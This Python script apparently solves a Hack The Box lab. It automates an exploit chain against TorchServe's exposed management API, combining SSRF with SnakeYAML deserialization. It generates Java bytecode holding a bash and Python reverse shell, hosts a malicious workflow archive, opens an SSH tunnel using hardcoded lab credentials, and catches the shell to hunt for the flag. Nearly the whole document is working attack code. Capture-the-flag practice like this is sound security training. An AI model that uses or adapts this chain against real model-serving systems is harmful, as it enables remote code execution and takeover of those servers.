#!/usr/bin/env python3
import argparse
import functools
import http.server
import re
import random
import shutil
import signal
import socket
import socketserver
import string
import subprocess
import tempfile
import threading
import time
from pathlib import Path
from typing import Optional

import pexpect
import requests
from jawa.cf import ClassFile
from jawa.util.bytecode import Instruction, Operand, OperandTypes


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description=(
            "Solve the model deployment tampering lab by exploiting TorchServe "
            "management API exposure, SSRF, and SnakeYAML deserialization to "
            "retrieve the flag."
        )
    )
    parser.add_argument("--host", default="154.57.164.74")
    parser.add_argument("--ssh-port", type=int, default=32719)
    parser.add_argument("--ssh-user", default="htb-stdnt")
    parser.add_argument("--ssh-password", default="4c4demy_Studen7")
    parser.add_argument("--mgmt-port", type=int, default=8081)
    parser.add_argument("--serve-port", type=int, default=8000)
    parser.add_argument("--shell-port", type=int, default=4444)
    parser.add_argument("--timeout", type=int, default=45)
    return parser.parse_args()


def random_suffix(length: int = 6) -> str:
    alphabet = string.ascii_lowercase + string.digits
    return "".join(random.choice(alphabet) for _ in range(length))


def choose_free_port(preferred: int) -> int:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.bind(("127.0.0.1", preferred))
        return sock.getsockname()[1]
    except OSError:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]
    finally:
        sock.close()


def ensure_tool(name: str) -> str:
    path = shutil.which(name)
    if not path:
        raise SystemExit(f"[!] Required tool not found in PATH: {name}")
    return path


def build_java_payload_class(output_dir: Path, shell_port: int) -> None:
    """Generate a ScriptEngineFactory class that launches a bash reverse shell."""
    # bash -c ensures bash handles /dev/tcp (ash/sh won't); python3 as fallback
    shell_command = (
        f"bash -c 'bash -i >& /dev/tcp/127.0.0.1/{shell_port} 0>&1 2>&1' 2>/dev/null || "
        f"python3 -c 'import socket,os,subprocess;"
        f"s=socket.socket();s.connect((\"127.0.0.1\",{shell_port}));"
        f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        f"subprocess.call([\"/bin/sh\",\"-i\"])'"
    )

    class_name = "exploit/MyScriptEngineFactory"
    cf = ClassFile.create(class_name, "java/lang/Object")
    cf.version = (52, 0)
    cf.access_flags.acc_public = True
    cf.access_flags.acc_super = True
    cf._interfaces = [cf.constants.create_class("javax/script/ScriptEngineFactory").index]

    class_string = cf.constants.create_class("java/lang/String")
    super_init = cf.constants.create_method_ref("java/lang/Object", "<init>", "()V")
    runtime_get = cf.constants.create_method_ref(
        "java/lang/Runtime", "getRuntime", "()Ljava/lang/Runtime;"
    )
    runtime_exec = cf.constants.create_method_ref(
        "java/lang/Runtime", "exec", "([Ljava/lang/String;)Ljava/lang/Process;"
    )
    str_bin_sh = cf.constants.create_string("/bin/sh")
    str_dash_c = cf.constants.create_string("-c")
    str_command = cf.constants.create_string(shell_command)

    init_method = cf.methods.create("<init>", "()V", code=True)
    init_method.access_flags.acc_public = True
    init_method.code.max_stack = 8
    init_method.code.max_locals = 1
    init_method.code.assemble(
        [
            Instruction.create("aload_0"),
            Instruction.create(
                "invokespecial",
                [Operand(OperandTypes.CONSTANT_INDEX, super_init.index)],
            ),
            Instruction.create(
                "invokestatic",
                [Operand(OperandTypes.CONSTANT_INDEX, runtime_get.index)],
            ),
            Instruction.create("iconst_3"),
            Instruction.create(
                "anewarray",
                [Operand(OperandTypes.CONSTANT_INDEX, class_string.index)],
            ),
            Instruction.create("dup"),
            Instruction.create("iconst_0"),
            Instruction.create(
                "ldc",
                [Operand(OperandTypes.CONSTANT_INDEX, str_bin_sh.index)],
            ),
            Instruction.create("aastore"),
            Instruction.create("dup"),
            Instruction.create("iconst_1"),
            Instruction.create(
                "ldc",
                [Operand(OperandTypes.CONSTANT_INDEX, str_dash_c.index)],
            ),
            Instruction.create("aastore"),
            Instruction.create("dup"),
            Instruction.create("iconst_2"),
            Instruction.create(
                "ldc_w",
                [Operand(OperandTypes.CONSTANT_INDEX, str_command.index)],
            ),
            Instruction.create("aastore"),
            Instruction.create(
                "invokevirtual",
                [Operand(OperandTypes.CONSTANT_INDEX, runtime_exec.index)],
            ),
            Instruction.create("pop"),
            Instruction.create("return"),
        ]
    )

    null_methods = {
        "getEngineName": "()Ljava/lang/String;",
        "getEngineVersion": "()Ljava/lang/String;",
        "getExtensions": "()Ljava/util/List;",
        "getMimeTypes": "()Ljava/util/List;",
        "getNames": "()Ljava/util/List;",
        "getLanguageName": "()Ljava/lang/String;",
        "getLanguageVersion": "()Ljava/lang/String;",
        "getParameter": "(Ljava/lang/String;)Ljava/lang/Object;",
        "getMethodCallSyntax": "(Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;)Ljava/lang/String;",
        "getOutputStatement": "(Ljava/lang/String;)Ljava/lang/String;",
        "getProgram": "([Ljava/lang/String;)Ljava/lang/String;",
        "getScriptEngine": "()Ljavax/script/ScriptEngine;",
    }

    for method_name, descriptor in null_methods.items():
        method = cf.methods.create(method_name, descriptor, code=True)
        method.access_flags.acc_public = True
        method.code.max_stack = 1
        method.code.max_locals = 6
        method.code.assemble(
            [Instruction.create("aconst_null"), Instruction.create("areturn")]
        )

    class_path = output_dir / "exploit" / "MyScriptEngineFactory.class"
    class_path.parent.mkdir(parents=True, exist_ok=True)
    with class_path.open("wb") as class_file:
        cf.save(class_file)


def build_service_layout(work_dir: Path) -> None:
    services_dir = work_dir / "META-INF" / "services"
    services_dir.mkdir(parents=True, exist_ok=True)
    (services_dir / "javax.script.ScriptEngineFactory").write_text(
        "exploit.MyScriptEngineFactory\n",
        encoding="utf-8",
    )


def build_workflow_archive(work_dir: Path, workflow_name: str, serve_port: int) -> Path:
    handler_path = work_dir / "handler.py"
    spec_path = work_dir / "spec.yaml"

    handler_path.write_text(
        "def initialize(self, context):\n    self.model = self.load_model()\n",
        encoding="utf-8",
    )
    spec_path.write_text(
        "!!javax.script.ScriptEngineManager "
        f"[!!java.net.URLClassLoader [[!!java.net.URL [\"http://127.0.0.1:{serve_port}/\"]]]]\n",
        encoding="utf-8",
    )

    archiver = ensure_tool("torch-workflow-archiver")
    subprocess.run(
        [
            archiver,
            "--workflow-name",
            workflow_name,
            "--spec-file",
            str(spec_path),
            "--handler",
            str(handler_path),
        ],
        cwd=work_dir,
        check=True,
        capture_output=True,
        text=True,
    )
    return work_dir / f"{workflow_name}.war"


def start_http_server(work_dir: Path, serve_port: int):
    """Serve files from work_dir for TorchServe to fetch the WAR."""
    class QuietHandler(http.server.SimpleHTTPRequestHandler):
        def log_message(self, format, *args):
            return

    class ReusableTCPServer(socketserver.ThreadingTCPServer):
        allow_reuse_address = True

    handler = functools.partial(QuietHandler, directory=str(work_dir))
    httpd = ReusableTCPServer(("127.0.0.1", serve_port), handler)
    thread = threading.Thread(target=httpd.serve_forever, daemon=True)
    thread.start()
    return httpd, thread


def start_shell_listener(shell_port: int) -> socket.socket:
    """Create a TCP listener for the reverse shell callback."""
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", shell_port))
    srv.listen(1)
    return srv


def accept_shell_and_get_flag(srv: socket.socket, timeout: int = 45) -> Optional[str]:
    """Accept the reverse shell, run enumeration commands, return the flag."""
    srv.settimeout(timeout)
    try:
        conn, _ = srv.accept()
    except socket.timeout:
        return None

    try:
        # Brief pause for the shell to initialize, then drain the prompt
        time.sleep(0.5)
        conn.settimeout(0.3)
        try:
            conn.recv(4096)  # discard initial prompt only
        except socket.timeout:
            pass

        # Run: check cwd first (writeup just runs bare ls), then known paths
        cmd = (
            "pwd 2>/dev/null; "
            "ls 2>/dev/null; "
            "cat flag_*.txt 2>/dev/null; "
            "ls /home/htb-stdnt/ 2>/dev/null; "
            "cat /home/htb-stdnt/flag_*.txt 2>/dev/null; "
            "find / -maxdepth 5 -name 'flag*' -type f 2>/dev/null | head -10; "
            "exit\n"
        )
        conn.sendall(cmd.encode())
        # Close our write side — bash -i sees EOF and exits, closing the connection
        conn.shutdown(socket.SHUT_WR)

        # Collect output until the connection closes or timeout
        output = b""
        conn.settimeout(20)
        deadline = time.time() + 20
        while time.time() < deadline:
            try:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                output += chunk
            except socket.timeout:
                break

        text = output.decode("utf-8", errors="replace")
        m = re.search(r"HTB\{[^}]+\}", text)
        if m:
            return m.group(0)
        # Return raw output so the caller can show it
        return f"[raw output]\n{text}"
    finally:
        conn.close()


TORCHSERVE_MGMT_REMOTE_PORT = 8081  # TorchServe management always binds on this port remotely


def start_ssh_tunnel(args: argparse.Namespace):
    cmd = (
        "ssh -o StrictHostKeyChecking=no -o ExitOnForwardFailure=yes "
        f"-p {args.ssh_port} "
        f"-R {args.serve_port}:127.0.0.1:{args.serve_port} "
        f"-R {args.shell_port}:127.0.0.1:{args.shell_port} "
        f"-L {args.mgmt_port}:127.0.0.1:{TORCHSERVE_MGMT_REMOTE_PORT} "
        f"-N {args.ssh_user}@{args.host}"
    )

    child = pexpect.spawn(cmd, encoding="utf-8", timeout=20)
    while True:
        index = child.expect(
            [
                "Are you sure you want to continue connecting",
                "password:",
                pexpect.EOF,
                pexpect.TIMEOUT,
            ]
        )
        if index == 0:
            child.sendline("yes")
            continue
        if index == 1:
            child.sendline(args.ssh_password)
            break
        raise SystemExit("[!] SSH tunnel failed to start.")

    deadline = time.time() + args.timeout
    management_url = f"http://127.0.0.1:{args.mgmt_port}/"
    while time.time() < deadline:
        try:
            response = requests.get(management_url, timeout=3)
            if response.status_code in {200, 400, 401, 403, 405}:
                return child
        except requests.RequestException:
            time.sleep(1)

    child.close(force=True)
    raise SystemExit("[!] SSH tunnel came up, but forwarded management API was unreachable.")


def trigger_exploit(args: argparse.Namespace, workflow_name: str) -> requests.Response:
    management_url = f"http://127.0.0.1:{args.mgmt_port}/workflows"
    payload_url = f"http://127.0.0.1:{args.serve_port}/{workflow_name}.war"
    response = requests.post(
        management_url,
        params={"url": payload_url},
        timeout=10,
    )
    return response


def cleanup_tunnel(child):
    if child is None:
        return
    try:
        child.kill(signal.SIGTERM)
    except Exception:
        pass
    try:
        child.close(force=True)
    except Exception:
        pass


def main() -> None:
    args = parse_args()
    args.serve_port = choose_free_port(args.serve_port)
    args.mgmt_port = choose_free_port(args.mgmt_port)
    args.shell_port = choose_free_port(args.shell_port)
    workflow_name = f"pwn{random_suffix()}"

    print(f"[*] Ports — serve:{args.serve_port}  mgmt:{args.mgmt_port}  shell:{args.shell_port}")

    with tempfile.TemporaryDirectory(prefix="mdt_solver_") as temp_dir:
        work_dir = Path(temp_dir)

        build_service_layout(work_dir)
        build_java_payload_class(work_dir, args.shell_port)
        war_path = build_workflow_archive(work_dir, workflow_name, args.serve_port)
        if not war_path.exists():
            raise SystemExit("[!] Failed to generate workflow archive.")
        print(f"[*] Workflow archive built: {war_path.name}")

        httpd, server_thread = start_http_server(work_dir, args.serve_port)
        shell_srv = start_shell_listener(args.shell_port)
        print(f"[*] Listening for reverse shell on 127.0.0.1:{args.shell_port}")

        tunnel = None
        try:
            print("[*] Setting up SSH tunnel...")
            tunnel = start_ssh_tunnel(args)
            print("[*] Tunnel up. Triggering SSRF exploit...")

            response = trigger_exploit(args, workflow_name)
            print(f"[+] Triggered workflow load: HTTP {response.status_code}")

            print("[*] Waiting for reverse shell callback...")
            result = accept_shell_and_get_flag(shell_srv, timeout=args.timeout)

            if result is None:
                raise SystemExit("[!] No reverse shell connection received within timeout.")

            if result.startswith("HTB{"):
                print(f"[+] Flag: {result}")
            else:
                print(result)
        finally:
            shell_srv.close()
            cleanup_tunnel(tunnel)
            httpd.shutdown()
            httpd.server_close()
            server_thread.join(timeout=2)



if __name__ == "__main__":
    main()